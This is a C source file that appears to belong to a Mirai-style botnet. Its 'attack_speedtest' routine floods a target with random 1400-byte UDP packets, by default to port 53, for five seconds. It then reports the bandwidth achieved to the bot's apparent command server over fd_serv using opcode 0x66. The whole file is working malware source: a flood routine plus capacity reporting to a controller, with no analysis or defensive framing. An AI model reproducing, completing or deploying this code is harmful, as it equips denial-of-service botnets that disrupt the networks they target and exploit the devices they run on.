#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <time.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"

void attack_speedtest(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    uint16_t data_len = 1400;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    uint32_t duration = 5;

    extern int fd_serv;
#ifdef DEBUG
    printf("[speedtest] Starting speed test for %d seconds, target: %s\n", duration, inet_ntoa(*(struct in_addr*)&targs[0].addr));
    printf("[speedtest] fd_serv = %d\n", fd_serv);
    fflush(stdout);
#endif

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
#ifdef DEBUG
        perror("[speedtest] socket creation failed");
#endif
        return;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(dport);
    addr.sin_addr.s_addr = targs[0].addr;

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
#ifdef DEBUG
        perror("[speedtest] connect failed");
#endif
        close(fd);
        return;
    }

    char *payload = calloc(data_len, 1);
    if (!payload) {
#ifdef DEBUG
        printf("[speedtest] calloc failed\n");
#endif
        close(fd);
        return;
    }
    rand_str(payload, data_len);

    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);
    uint64_t bytes_sent = 0;
    long packets_sent = 0;
    long last_print = 0;

#ifdef DEBUG
    printf("[speedtest] Sending packets for %d seconds...\n", duration);
    fflush(stdout);
#endif

    while (1) {
        ssize_t ret = send(fd, payload, data_len, MSG_NOSIGNAL);
        if (ret == data_len) {
            bytes_sent += data_len;
            packets_sent++;
            if (packets_sent % 10000 == 0) {
#ifdef DEBUG
                printf(".");
                fflush(stdout);
#endif
            }
        } else {
#ifdef DEBUG
            if (ret == -1) perror("[speedtest] send failed");
#endif
            break;
        }
        clock_gettime(CLOCK_MONOTONIC, &now);
        double elapsed = (now.tv_sec - start.tv_sec) + (now.tv_nsec - start.tv_nsec) / 1e9;
        if (elapsed >= duration) break;
    }

#ifdef DEBUG
    printf("\n[speedtest] Exited loop. packets_sent=%ld, bytes_sent=%llu\n", packets_sent, bytes_sent);
    fflush(stdout);
#endif

    double mbps = (bytes_sent * 8.0) / (duration * 1e6);
    uint32_t mbps_fixed = (uint32_t)(mbps * 10);
    uint32_t mbps_net = htonl(mbps_fixed);

#ifdef DEBUG
    printf("[speedtest] Sent %llu bytes (%ld packets) in %d seconds -> %.2f Mbps (fixed=%u)\n",
           bytes_sent, packets_sent, duration, mbps, mbps_fixed);
    fflush(stdout);
#endif


    if (fd_serv <= 0) {
#ifdef DEBUG
        printf("[speedtest] fd_serv is invalid (%d), cannot send result\n", fd_serv);
#endif
    } else {
        uint8_t op = 0x66;
        ssize_t sent = send(fd_serv, &op, 1, MSG_NOSIGNAL);
        if (sent != 1) {
#ifdef DEBUG
            perror("[speedtest] send op failed");
#endif
        } else {
            sent = send(fd_serv, &mbps_net, 4, MSG_NOSIGNAL);
            if (sent != 4) {
#ifdef DEBUG
                perror("[speedtest] send speed failed");
#endif
            } else {
#ifdef DEBUG
                printf("[speedtest] Result sent successfully\n");
#endif
            }
        }
    }

    close(fd);
    free(payload);
}
